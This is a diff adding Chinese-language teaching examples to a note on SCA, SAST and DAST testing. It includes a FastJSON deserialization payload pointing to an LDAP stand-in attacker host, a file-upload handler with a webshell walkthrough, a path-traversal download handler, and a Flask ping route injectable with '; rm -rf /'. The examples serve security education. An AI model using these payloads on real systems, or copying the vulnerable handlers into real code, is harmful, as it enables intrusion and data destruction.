@@ -145,3 +145,103 @@ DAST = 你跑起来的应用能不能被攻破（黑盒，看行为）
 
 三者互补，而非替代。
 ```
+
+## 再来一些本人觉得有趣的例子
+
+### SCA 案例：FastJSON 反序列化漏洞（CVE-2022-25845）
+
+攻击者可以构造特殊的 JSON 数据，利用这个特性实例化任意类并调用其 setter/getter 方法，进而执行任意代码。相当于初始化了一个万能遥控器类，选择攻击者为控制者，设置允许为 `true`。因此需要注意敏感词条 `type`、`autoCommit` 等。
+
+```http
+POST /api/parse HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://attacker.com/Exploit",
+    "autoCommit": true
+}
+```
+
+### SAST 案例：不安全的文件上传（Unrestricted File Upload）
+
+攻击者可上传 Webshell，获得服务器控制权，可伪装成其他类型文件，从而运行其脚本。
+
+如下是用户上传头像照片功能：
+
+```java
+@PostMapping("/upload")
+public String uploadFile(@RequestParam("file") MultipartFile file, HttpServletRequest request) {
+    // 获取上传目录
+    String uploadPath = request.getServletContext().getRealPath("/uploads/");
+    File uploadDir = new File(uploadPath);
+    if (!uploadDir.exists()) {
+        uploadDir.mkdirs();
+    }
+
+    // 使用原始文件名保存
+    String originalFilename = file.getOriginalFilename();
+    File destFile = new File(uploadPath + File.separator + originalFilename);
+
+    // 保存文件
+    file.transferTo(destFile);
+
+    return "上传成功！";
+}
+```
+
+此时若是上传一个 `shell.jsp` 文件，服务器保存至 `/uploads/shell.jsp` 路径下，然后访问 `https://example.com/uploads/shell.jsp` 执行代码，在 shell 中注入 `whoami` 指令即可获得用户信息。可用白名单文件、上传文件格式限制等操作维护。
+
+### DAST 案例：目录遍历（Directory Traversal）
+
+为下载指定文件功能：
+
+```java
+@GetMapping("/download")
+public void downloadFile(@RequestParam String filename, HttpServletResponse response) throws IOException {
+    // 文件保存在 /app/files/ 目录下
+    String baseDir = "/app/files/";
+    File file = new File(baseDir + filename);
+
+    if (file.exists()) {
+        // 设置响应头，输出文件
+        response.setContentType("application/octet-stream");
+        response.setHeader("Content-Disposition", "attachment; filename=" + filename);
+        FileInputStream fis = new FileInputStream(file);
+        IOUtils.copy(fis, response.getOutputStream());
+        fis.close();
+    } else {
+        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
+    }
+}
+```
+
+正常输入 `?filename=report.pdf`，即为正常下载 `report.pdf`。但若是使用 `../../` 即可回到父目录去访问敏感信息，如 `pwd`、`Info` 等。
+
+### SAST 案例：命令注入（Command Injection）
+
+📌 案例：Ping 功能导致的命令注入
+
+```python
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/ping')
+def ping():
+    # 获取用户输入的 IP
+    ip = request.args.get('ip', '127.0.0.1')
+
+    # 危险！直接拼接命令
+    command = f"ping -c 4 {ip}"
+    result = os.popen(command).read()
+
+    return f"<pre>{result}</pre>"
+
+if __name__ == '__main__':
+    app.run()
+```
+
+正常请求 `GET /ping?ip=8.8.8.8`。攻击请求 `GET /ping?ip=8.8.8.8; rm -rf /`，分解成两个指令，后者给你全删掉了。可以通过 `subprocess` 传递参数列表、严谨格式传递等方式解决。
